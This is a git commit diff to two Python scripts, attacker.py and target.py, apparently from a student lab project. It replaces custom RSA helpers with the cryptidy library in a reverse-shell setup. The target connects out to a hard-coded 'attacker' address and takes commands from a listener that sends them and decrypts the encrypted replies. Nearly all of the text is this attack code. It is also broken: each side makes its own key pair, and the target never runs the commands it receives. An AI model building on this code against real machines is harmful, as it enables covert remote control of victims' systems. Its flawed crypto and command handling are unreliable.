6a427a933d46a842fe692c1a327e76be6b2a2134
DhruvArora-03 <dhruvarora@utexas.edu>
2024-03-01 12:47:05 -0600

    using cryptidy instead

--- attacker.py
+++ attacker.py
@@ -21,33 +21,61 @@
 #     print(output.decode(), end="")
 # s.close()
 
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.asymmetric import padding
+# from cryptography.hazmat.primitives import serialization
+# from cryptography.hazmat.backends import default_backend
+# from cryptography.hazmat.primitives import hashes
+# from cryptography.hazmat.primitives.asymmetric import padding
 
+# import socket
+# import subprocess
+
+# def load_private_key():
+#     with open("private_key.pem", "rb") as key_file:
+#         private_key = serialization.load_pem_private_key(
+#             key_file.read(),
+#             password=None,
+#             backend=default_backend()
+#         )
+#     return private_key
+
+# def decrypt_message(encrypted, private_key):
+#     decrypted = private_key.decrypt(
+#         encrypted,
+#         padding.OAEP(
+#             mgf=padding.MGF1(algorithm=hashes.SHA256()),
+#             algorithm=hashes.SHA256(),
+#             label=None
+#         )
+#     )
+#     return decrypted.decode()
+
+# HOST = '10.0.2.6' # Listen on all network interfaces
+# PORT = 12345  # Choose a port number
+# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# s.bind((HOST, PORT))
+# s.listen(1)
+# print(f"Listening on {HOST}:{PORT}")
+# conn, addr = s.accept()
+# print(f"Connection from {addr}")
+
+# private_key = load_private_key()
+
+# while True:
+#     command = input("Enter command to execute or 'exit' to quit: ")
+#     if command.lower() == 'exit':
+#         conn.send(b'exit')
+#         conn.close()
+#         break
+#     conn.send(command.encode())
+#     encrypted_output = conn.recv(1024)
+#     output = decrypt_message(encrypted_output, private_key)
+#     print(output, end="")
+# s.close()
+
+
+from cryptidy import asymmetric_encryption
 import socket
 import subprocess
-
-def load_private_key():
-    with open("private_key.pem", "rb") as key_file:
-        private_key = serialization.load_pem_private_key(
-            key_file.read(),
-            password=None,
-            backend=default_backend()
-        )
-    return private_key
-
-def decrypt_message(encrypted, private_key):
-    decrypted = private_key.decrypt(
-        encrypted,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return decrypted.decode()
 
 HOST = '10.0.2.6' # Listen on all network interfaces
 PORT = 12345  # Choose a port number
@@ -58,7 +86,7 @@ print(f"Listening on {HOST}:{PORT}")
 conn, addr = s.accept()
 print(f"Connection from {addr}")
 
-private_key = load_private_key()
+priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
 
 while True:
     command = input("Enter command to execute or 'exit' to quit: ")
@@ -68,6 +96,6 @@ while True:
         break
     conn.send(command.encode())
     encrypted_output = conn.recv(1024)
-    output = decrypt_message(encrypted_output, private_key)
+    output = asymmetric_encryption.decrypt_message(encrypted_output, priv_key)
     print(output, end="")
 s.close()
--- target.py
+++ target.py
@@ -30,61 +30,85 @@
 #         s.send(str.encode(' '))
 # s.close()
 
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.asymmetric import padding
+# from cryptography.hazmat.primitives import serialization
+# from cryptography.hazmat.primitives.asymmetric import rsa
+# from cryptography.hazmat.backends import default_backend
+# from cryptography.hazmat.primitives import hashes
+# from cryptography.hazmat.primitives.asymmetric import padding
 
+# import socket
+# import subprocess
+# import os
+
+# def generate_rsa_keys():
+#     private_key = rsa.generate_private_key(
+#         public_exponent=65537,
+#         key_size=2048,
+#         backend=default_backend()
+#     )
+#     public_key = private_key.public_key()
+#     return private_key, public_key
+
+# def encrypt_message(message, public_key):
+#     encrypted = public_key.encrypt(
+#         message.encode(),
+#         padding.OAEP(
+#             mgf=padding.MGF1(algorithm=hashes.SHA256()),
+#             algorithm=hashes.SHA256(),
+#             label=None
+#         )
+#     )
+#     return encrypted
+
+# def decrypt_message(encrypted, private_key):
+#     decrypted = private_key.decrypt(
+#         encrypted,
+#         padding.OAEP(
+#             mgf=padding.MGF1(algorithm=hashes.SHA256()),
+#             algorithm=hashes.SHA256(),
+#             label=None
+#         )
+#     )
+#     return decrypted.decode()
+
+# HOST = '10.0.2.4'  # Attacker's IP address
+# PORT = 12345  # Same port number used in the listener
+# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# s.connect((HOST, PORT))
+
+# private_key, public_key = generate_rsa_keys()
+
+# while True:
+#     data = s.recv(1024)
+#     if data[:2].decode('utf-8') == 'cd':
+#         os.chdir(data[3:].decode('utf-8'))
+#     if len(data) > 0:
+#         encrypted_data = encrypt_message(data.decode('utf-8'), public_key)
+#         s.send(encrypted_data)
+#     else:
+#         s.send(b' ')
+# s.close()
+
+from cryptidy import asymmetric_encryption
 import socket
 import subprocess
 import os
-
-def generate_rsa_keys():
-    private_key = rsa.generate_private_key(
-        public_exponent=65537,
-        key_size=2048,
-        backend=default_backend()
-    )
-    public_key = private_key.public_key()
-    return private_key, public_key
-
-def encrypt_message(message, public_key):
-    encrypted = public_key.encrypt(
-        message.encode(),
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return encrypted
-
-def decrypt_message(encrypted, private_key):
-    decrypted = private_key.decrypt(
-        encrypted,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return decrypted.decode()
 
 HOST = '10.0.2.4'  # Attacker's IP address
 PORT = 12345  # Same port number used in the listener
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
-private_key, public_key = generate_rsa_keys()
+priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
 
 while True:
     data = s.recv(1024)
     if data[:2].decode('utf-8') == 'cd':
         os.chdir(data[3:].decode('utf-8'))
     if len(data) > 0:
-        encrypted_data = encrypt_message(data.decode('utf-8'), public_key)
+        encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
         s.send(encrypted_data)
     else:
         s.send(b' ')
 s.close()
+
